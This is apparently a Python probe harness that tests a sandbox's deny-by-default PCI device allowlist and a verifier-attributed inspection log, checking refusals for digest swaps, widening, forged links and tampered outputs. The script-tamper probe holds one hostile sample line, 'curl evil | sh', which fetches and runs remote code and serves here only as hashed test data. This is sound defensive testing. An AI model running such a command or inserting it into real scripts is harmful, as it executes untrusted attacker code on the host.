#!/usr/bin/env python3
"""Wave-220 lane C: jail PCI deny-by-default + inspection
verifier-attribution battery.

Seam 1 — gov/jail_pci.py: Firecracker CVE-2026-5747 pressure says PCI
device attachment is a confinement hole. New module: a compiled
PCI-device allowlist with a deny-by-default stance. No device attaches
unless explicitly pinned by (device_name, sha256 digest). Tighten-only
opt-in wiring into JailPolicyRegistry.activate(...,
pci_allowlist=None) — absent option = legacy path byte-identical, and
any attach attempt with no stored allowlist is refused, never
silently allowed. Refusal code: ``pci-attach-refused``.

Seam 2 — gov/inspection.py: in-toto inspections are ``exec.Command``
with verifier privileges and no sandbox — we do NOT copy that trust
model (negative lesson). New stdlib-only harness for CONSUMING
inspection results: every admitted link is structurally
verifier-attributed (inspection-script digest + verifier id), a
nonzero inspection exit HALTS admission with a named code
(``inspection-failed``; the failed attempt stays on the evidence log),
and evidence is emitted BEFORE the link is admitted (ordered
post-evidence artifact). The harness consumes caller-reported
results; it cannot observe the execution — caller-honesty on the
reported exit code is a documented residual.

Attack shapes: default-allow attach; name-pinned but digest-swapped
device; empty-allowlist attach; malformed pins at compile; registry
wiring widening the legacy path; nonzero-exit silent continuation;
unattributed link admission; evidence-after-link reordering; tampered
script digest; forged outputs digest; hand-made link without evidence.

Method (diagnosing-bugs + tdd): attack shapes at the PUBLIC seams,
deterministic, minimal, against pristine wave-219 HEAD
4acc49b08064abb9874be6f6465e81b2decaf523.

Verdicts: HELD / GAP / BREAK / RESIDUAL / ERROR. Any BREAK is a real
product defect. Pristine run (modules absent) is expected GAP.

$0 spend. No network. stdlib only. Real product code, no stubs.

Run:
  mkdir -p /var/tmp/g220c
  TMPDIR=/var/tmp/g220c ~/workspace/.gov-venv/bin/python evals/w220_jailinspect_probes.py
Standalone:
  env -u GOV_DEPLOYMENT_MODE TMPDIR=/var/tmp/g220c-u \\
      ~/workspace/.gov-venv/bin/python evals/w220_jailinspect_probes.py
"""

import hashlib
import os
import secrets
import subprocess
import sys

os.environ.setdefault("GOV_DEPLOYMENT_MODE", "staging")
os.environ.setdefault("GOV_LOG_KEY", secrets.token_hex(32))
os.environ.setdefault("GOV_LOG_KEY_EPOCH", "w220-jailinspect-probes")
# Wave-112: the TMPDIR fallback must exist, or tempfile silently
# degrades to /tmp.
_TMPDIR_FALLBACK = "/var/tmp/g220c-%d" % os.getpid()
os.environ.setdefault("TMPDIR", _TMPDIR_FALLBACK)
try:
    os.makedirs(os.environ["TMPDIR"], exist_ok=True)
except OSError:
    pass

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)

GREEN_SKIP = os.environ.get("GOV_SKIP_GREEN") == "1"

try:
    from gov import jail_pci as jpci  # noqa: E402
    from gov import inspection as insp  # noqa: E402
    from gov import jail_policy as jp  # noqa: E402
    from gov import ed25519 as _ed  # noqa: E402
    _IMPORT_OK = True
    _IMPORT_ERR = None
except Exception as exc:  # noqa: BLE001 - pristine run has no modules
    jpci = None
    insp = None
    jp = None
    _ed = None
    _IMPORT_OK = False
    _IMPORT_ERR = exc

_RESULTS = []
_PROBE_FNS = {}


def probe(name):
    def deco(fn):
        _PROBE_FNS[name] = fn
        return fn
    return deco


def _record(name, verdict, detail):
    _RESULTS.append((name, verdict, detail))


def _held(name, detail=""):
    _record(name, "HELD", detail)


def _gap(name, detail=""):
    _record(name, "GAP", detail)


def _break(name, detail=""):
    _record(name, "BREAK", detail)


def _code_of(exc):
    return getattr(exc, "code", None)


def _sha(b):
    return hashlib.sha256(b).hexdigest()


# ----------------------------------------------------------------------
# PCI seam probes.
# ----------------------------------------------------------------------

@probe("pci-01-default-deny-no-allowlist")
def _pci_default_deny():
    """Attach with no allowlist anywhere is refused with the named
    code -- deny-by-default, not default-allow."""
    allowlist = jpci.compile_pci_allowlist([])
    try:
        allowlist.authorize("net0", _sha(b"fw"))
    except jpci.JailPCIError as exc:
        if _code_of(exc) == "pci-attach-refused":
            _held("pci-01-default-deny-no-allowlist",
                  "empty allowlist refuses: %s" % exc)
        else:
            _break("pci-01-default-deny-no-allowlist",
                   "wrong code %r" % _code_of(exc))
    else:
        _break("pci-01-default-deny-no-allowlist",
               "empty allowlist ALLOWED an attach (default-allow)")


@probe("pci-02-explicit-pin-allows")
def _pci_pin_allows():
    """A (name, digest)-pinned device attaches and the grant is
    audit-visible."""
    digest = _sha(b"firmware-v1")
    allowlist = jpci.compile_pci_allowlist(
        [{"device_name": "net0", "device_digest": digest}])
    grant = allowlist.authorize("net0", digest)
    if grant.get("allowed") is True \
            and grant.get("device_name") == "net0" \
            and grant.get("device_digest") == digest:
        _held("pci-02-explicit-pin-allows",
              "grant carries name+digest pins")
    else:
        _break("pci-02-explicit-pin-allows",
               "grant not audit-visible: %r" % (grant,))


@probe("pci-03-digest-swap-refused")
def _pci_digest_swap():
    """Name pinned but digest swapped: refused -- the pin binds both."""
    allowlist = jpci.compile_pci_allowlist(
        [{"device_name": "net0", "device_digest": _sha(b"firmware-v1")}])
    try:
        allowlist.authorize("net0", _sha(b"firmware-EVIL"))
    except jpci.JailPCIError as exc:
        if _code_of(exc) == "pci-attach-refused":
            _held("pci-03-digest-swap-refused", "digest swap refused")
        else:
            _break("pci-03-digest-swap-refused",
                   "wrong code %r" % _code_of(exc))
    else:
        _break("pci-03-digest-swap-refused",
               "digest-swapped device ALLOWED")


@probe("pci-04-unpinned-name-refused")
def _pci_unpinned_name():
    """A device name never pinned is refused even when the digest is
    well-formed."""
    allowlist = jpci.compile_pci_allowlist(
        [{"device_name": "net0", "device_digest": _sha(b"firmware-v1")}])
    try:
        allowlist.authorize("gpu0", _sha(b"something"))
    except jpci.JailPCIError as exc:
        if _code_of(exc) == "pci-attach-refused":
            _held("pci-04-unpinned-name-refused", "unknown name refused")
        else:
            _break("pci-04-unpinned-name-refused",
                   "wrong code %r" % _code_of(exc))
    else:
        _break("pci-04-unpinned-name-refused",
               "unpinned device name ALLOWED")


@probe("pci-05-malformed-pin-compile-refused")
def _pci_malformed_pin():
    """Malformed pins are refused AT COMPILE (authoring error), not at
    attach time."""
    bad = [
        [{"device_name": "net0", "device_digest": "not-hex"}],
        [{"device_name": "net0", "device_digest": "ab" * 10}],  # short
        [{"device_name": "BAD NAME!", "device_digest": _sha(b"x")}],
        [{"device_name": "net0"}],  # missing digest
        [{"device_digest": _sha(b"x")}],  # missing name
        [{"device_name": "net0", "device_digest": _sha(b"x"),
          "extra": "field"}],  # unknown field
    ]
    codes = []
    for entries in bad:
        try:
            jpci.compile_pci_allowlist(entries)
        except jpci.JailPCIError as exc:
            codes.append(_code_of(exc))
        else:
            codes.append(None)
    if all(c == "device-pin-malformed" for c in codes):
        _held("pci-05-malformed-pin-compile-refused",
              "6/6 malformed pins refused at compile")
    else:
        _break("pci-05-malformed-pin-compile-refused",
               "codes: %r" % (codes,))


@probe("pci-06-registry-wiring-tighten-only")
def _pci_registry_wiring():
    """JailPolicyRegistry wiring is tighten-only: activate(...,
    pci_allowlist=None) leaves the legacy path byte-identical, and
    attach attempts with no stored allowlist are refused by default."""
    seed = hashlib.sha256(b"w220-pci-issuer").digest()
    pub = _ed.publickey(seed)
    reg = jp.JailPolicyRegistry(pub)
    body = jp.make_policy_body("tool-python", 1,
                               writable_dirs=["/output"])
    sig = jp.sign_policy(seed, body)
    reg.activate({"body": body, "signature": sig},
                 now=1, features={"timeout", "rlimit", "pivot_root",
                                  "seccomp", "privdrop", "pidns", "netns"})
    # Legacy pins byte-identical: conformance report and sandbox kwargs.
    report = reg.check("tool-python", 1,
                       {"writable_dirs": ["/output"],
                        "wants_network": False, "timeout_s": 5}, now=1)
    expected_digest = jp.policy_digest(body)
    if report.get("policy_digest") != expected_digest:
        _break("pci-06-registry-wiring-tighten-only",
               "legacy check pin drifted")
        return
    kwargs = jp.to_sandbox_kwargs(
        reg.get("tool-python", 1, now=1), {"/output": "/var/tmp/g220c-out"})
    if kwargs.get("cage_mode") != "strict" or kwargs.get("timeout") != 5:
        _break("pci-06-registry-wiring-tighten-only",
               "legacy to_sandbox_kwargs drifted")
        return
    # No allowlist stored: attach refused by default.
    try:
        reg.authorize_pci_attach("tool-python", 1, "net0", _sha(b"x"),
                                 now=1)
    except jp.JailPolicyError as exc:
        if _code_of(exc) != "pci-attach-refused":
            _break("pci-06-registry-wiring-tighten-only",
                   "wrong refusal code %r" % _code_of(exc))
            return
    else:
        _break("pci-06-registry-wiring-tighten-only",
               "attach ALLOWED with no stored allowlist")
        return
    # With an allowlist stored at activation: pinned attach allowed,
    # unpinned refused.
    reg2 = jp.JailPolicyRegistry(pub)
    digest = _sha(b"firmware-v1")
    allow = jpci.compile_pci_allowlist(
        [{"device_name": "net0", "device_digest": digest}])
    reg2.activate({"body": body, "signature": sig}, now=1,
                  features={"timeout", "rlimit", "pivot_root", "seccomp",
                            "privdrop", "pidns", "netns"},
                  pci_allowlist=allow)
    grant = reg2.authorize_pci_attach("tool-python", 1, "net0", digest,
                                      now=1)
    if grant.get("allowed") is not True:
        _break("pci-06-registry-wiring-tighten-only",
               "stored allowlist did not authorize a pinned device")
        return
    try:
        reg2.authorize_pci_attach("tool-python", 1, "gpu0", digest, now=1)
    except jp.JailPolicyError as exc:
        if _code_of(exc) == "pci-attach-refused":
            _held("pci-06-registry-wiring-tighten-only",
                  "legacy pins byte-identical; attach refuses by "
                  "default; stored allowlist enforced")
        else:
            _break("pci-06-registry-wiring-tighten-only",
                   "wrong code %r" % _code_of(exc))
    else:
        _break("pci-06-registry-wiring-tighten-only",
               "stored allowlist allowed an unpinned device")


@probe("pci-07-allowlist-widening-refused")
def _pci_widening_refused():
    """Tighten-only is ENFORCED: activating a higher version with a
    wider allowlist is refused; shrinking is allowed."""
    seed = hashlib.sha256(b"w220-pci-issuer").digest()
    pub = _ed.publickey(seed)
    reg = jp.JailPolicyRegistry(pub)
    features = {"timeout", "rlimit", "pivot_root", "seccomp", "privdrop",
                "pidns", "netns"}
    d1, d2 = _sha(b"fw1"), _sha(b"fw2")

    def activate_ver(version, pins):
        body = jp.make_policy_body("tool-python", version,
                                   writable_dirs=["/output"])
        sig = jp.sign_policy(seed, body)
        allow = jpci.compile_pci_allowlist(
            [{"device_name": n, "device_digest": d} for n, d in pins])
        reg.activate({"body": body, "signature": sig}, now=1,
                     features=features, pci_allowlist=allow)

    activate_ver(1, [("net0", d1)])
    try:
        activate_ver(2, [("net0", d1), ("gpu0", d2)])
    except jp.JailPolicyError as exc:
        widening_code = _code_of(exc)
    else:
        _break("pci-07-allowlist-widening-refused",
               "wider allowlist ACTIVATED (tighten-only not enforced)")
        return
    if widening_code != "pci-allowlist-widening-refused":
        _break("pci-07-allowlist-widening-refused",
               "wrong code %r" % widening_code)
        return
    # Shrinking across versions is allowed and enforced at authorize.
    activate_ver(2, [("net0", d1)])
    grant = reg.authorize_pci_attach("tool-python", 2, "net0", d1,
                                     now=1)
    if grant.get("allowed") is not True:
        _break("pci-07-allowlist-widening-refused",
               "shrink activation did not authorize the kept pin")
        return
    try:
        reg.authorize_pci_attach("tool-python", 2, "gpu0", d2, now=1)
    except jp.JailPolicyError as exc:
        if _code_of(exc) == "pci-attach-refused":
            _held("pci-07-allowlist-widening-refused",
                  "widening refused; shrinking allowed and enforced")
        else:
            _break("pci-07-allowlist-widening-refused",
                   "wrong code %r" % _code_of(exc))
    else:
        _break("pci-07-allowlist-widening-refused",
               "dropped pin still authorized after shrink")


# ----------------------------------------------------------------------
# Inspection seam probes.
# ----------------------------------------------------------------------

@probe("insp-01-nonzero-exit-halts")
def _insp_nonzero_halts():
    """A nonzero inspection exit HALTS admission with the named code --
    never silently continues."""
    log = insp.InspectionLog(verifier_id="verifier-1")
    script = b"#!/bin/sh\nexit 3\n"
    try:
        log.admit("build", script, _sha(script), 3, b"partial output")
    except insp.InspectionError as exc:
        if _code_of(exc) == "inspection-failed":
            # The failed attempt stays on the evidence log (halt, not
            # silent drop).
            if log.verify() is True:
                _held("insp-01-nonzero-exit-halts",
                      "halted with code; failure recorded on log")
            else:
                _break("insp-01-nonzero-exit-halts",
                       "log failed verify after recording failure")
        else:
            _break("insp-01-nonzero-exit-halts",
                   "wrong code %r" % _code_of(exc))
    else:
        _break("insp-01-nonzero-exit-halts",
               "nonzero exit ADMITTED (silent continuation)")


@probe("insp-02-verifier-attribution")
def _insp_attribution():
    """Every admitted link is structurally verifier-attributed: it
    carries the inspection script's digest and the verifier id."""
    log = insp.InspectionLog(verifier_id="verifier-1")
    script = b"#!/bin/sh\necho ok\n"
    link = log.admit("build", script, _sha(script), 0, b"ok")
    if link.get("verifier_attributed") is True \
            and link.get("script_digest") == _sha(script) \
            and link.get("verifier_id") == "verifier-1" \
            and link.get("name") == "build":
        _held("insp-02-verifier-attribution",
              "link carries script digest + verifier id")
    else:
        _break("insp-02-verifier-attribution",
               "link unattributed: %r" % (link,))


@probe("insp-03-evidence-before-link")
def _insp_evidence_order():
    """Evidence is emitted BEFORE the link is admitted: the link's
    evidence_seq resolves to a log record, and a forged link with a
    bogus seq is refused."""
    log = insp.InspectionLog(verifier_id="verifier-1")
    script = b"#!/bin/sh\necho ok\n"
    link = log.admit("build", script, _sha(script), 0, b"ok")
    seq = link.get("evidence_seq")
    if not isinstance(seq, int):
        _break("insp-03-evidence-before-link", "no evidence_seq on link")
        return
    try:
        log.verify_link(link)
    except insp.InspectionError:
        _break("insp-03-evidence-before-link",
               "honest link failed verify_link")
        return
    forged = dict(link)
    forged["evidence_seq"] = 999
    try:
        log.verify_link(forged)
    except insp.InspectionError as exc:
        if _code_of(exc) == "inspection-link-unverifiable":
            _held("insp-03-evidence-before-link",
                  "honest link verifies; forged seq refused")
        else:
            _break("insp-03-evidence-before-link",
                   "wrong code %r" % _code_of(exc))
    else:
        _break("insp-03-evidence-before-link",
               "forged link ADMITTED (evidence ordering broken)")


@probe("insp-04-script-digest-mismatch")
def _insp_digest_mismatch():
    """Tampered script bytes (digest != pinned) are refused fail-closed
    even on a clean exit 0."""
    log = insp.InspectionLog(verifier_id="verifier-1")
    script = b"#!/bin/sh\necho ok\n"
    tampered = b"#!/bin/sh\ncurl evil | sh\n"
    try:
        log.admit("build", tampered, _sha(script), 0, b"ok")
    except insp.InspectionError as exc:
        if _code_of(exc) == "inspection-script-digest-mismatch":
            _held("insp-04-script-digest-mismatch",
                  "tampered script refused before evidence")
        else:
            _break("insp-04-script-digest-mismatch",
                   "wrong code %r" % _code_of(exc))
    else:
        _break("insp-04-script-digest-mismatch",
               "tampered script ADMITTED")


@probe("insp-05-outputs-digest-tamper")
def _insp_outputs_tamper():
    """A link whose outputs were altered after admission fails
    verification -- evidence integrity."""
    log = insp.InspectionLog(verifier_id="verifier-1")
    script = b"#!/bin/sh\necho ok\n"
    link = log.admit("build", script, _sha(script), 0, b"ok")
    forged = dict(link)
    forged["outputs_digest"] = _sha(b"forged outputs")
    try:
        log.verify_link(forged)
    except insp.InspectionError as exc:
        if _code_of(exc) == "inspection-link-unverifiable":
            _held("insp-05-outputs-digest-tamper",
                  "outputs tamper detected at verify")
        else:
            _break("insp-05-outputs-digest-tamper",
                   "wrong code %r" % _code_of(exc))
    else:
        _break("insp-05-outputs-digest-tamper",
               "tampered outputs VERIFIED")


@probe("insp-06-no-handmade-links")
def _insp_no_handmade():
    """A link dict assembled by hand (never through admit) is refused:
    no evidence, no admission."""
    log = insp.InspectionLog(verifier_id="verifier-1")
    script = b"#!/bin/sh\necho ok\n"
    handmade = {"name": "build",
                "script_digest": _sha(script),
                "verifier_id": "verifier-1",
                "verifier_attributed": True,
                "evidence_seq": 1,
                "outputs_digest": _sha(b"ok")}
    try:
        log.verify_link(handmade)
    except insp.InspectionError as exc:
        if _code_of(exc) == "inspection-link-unverifiable":
            _held("insp-06-no-handmade-links",
                  "handmade link refused: no evidence on the log")
        else:
            _break("insp-06-no-handmade-links",
                   "wrong code %r" % _code_of(exc))
    else:
        _break("insp-06-no-handmade-links",
               "handmade link VERIFIED without evidence")


# ----------------------------------------------------------------------
# Runner.
# ----------------------------------------------------------------------

def _run_green_checks():
    if GREEN_SKIP:
        return [("green-check", "SKIP",
                 "GOV_SKIP_GREEN=1 (depth-1 nesting convention)")]
    notes = []
    path = os.path.join(REPO, "tests/test_jail_pci.py")
    if not os.path.exists(path):
        return [("green-check", "SKIP", "unit tests not written yet")]
    env = dict(os.environ)
    env["GOV_SKIP_GREEN"] = "1"
    proc = subprocess.run(
        [sys.executable, "-m", "unittest", "tests.test_jail_pci", "-v"],
        env=env, cwd=REPO,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=600)
    out = proc.stdout.decode("utf-8", "replace")
    if proc.returncode == 0:
        notes.append(("green-check", "PASS", "unit tests green"))
    else:
        notes.append(("green-check", "FAIL", out[-500:] if out else "no output"))
    return notes


def _run_once():
    _RESULTS.clear()
    names = sorted(_PROBE_FNS)
    if not _IMPORT_OK:
        for name in names:
            _gap(name, "module absent on pristine base")
        return [(n, "GAP") for n in names]
    for name in names:
        try:
            _PROBE_FNS[name]()
        except Exception as exc:  # noqa: BLE001 - probe harness
            _record(name, "ERROR", "%s: %s" % (type(exc).__name__, exc))
    return [(n, v) for n, v, _ in _RESULTS]


def main():
    first = _run_once()
    second = _run_once()
    det_ok = [v for _, v in first] == [v for _, v in second]
    green = _run_green_checks()
    held = sum(1 for _, v in first if v == "HELD")
    gap = sum(1 for _, v in first if v == "GAP")
    brk = sum(1 for _, v in first if v == "BREAK")
    err = sum(1 for _, v in first if v == "ERROR")
    print("w220 jail/inspection probes: %d HELD / %d GAP / %d BREAK / "
          "%d ERROR (%d probes, determinism %s)"
          % (held, gap, brk, err, len(first),
             "PASS" if det_ok else "FAIL"))
    for name, verdict, detail in _RESULTS:
        print("  %-42s %s %s" % (name, verdict, detail))
    for name, status, detail in green:
        print("  %-42s %s %s" % (name, status, detail))
    if not _IMPORT_OK:
        print("import failed (pristine): %r" % (_IMPORT_ERR,))
    if brk or err or not det_ok:
        return 1
    if any(s not in ("PASS", "SKIP") for _, s, _ in green):
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
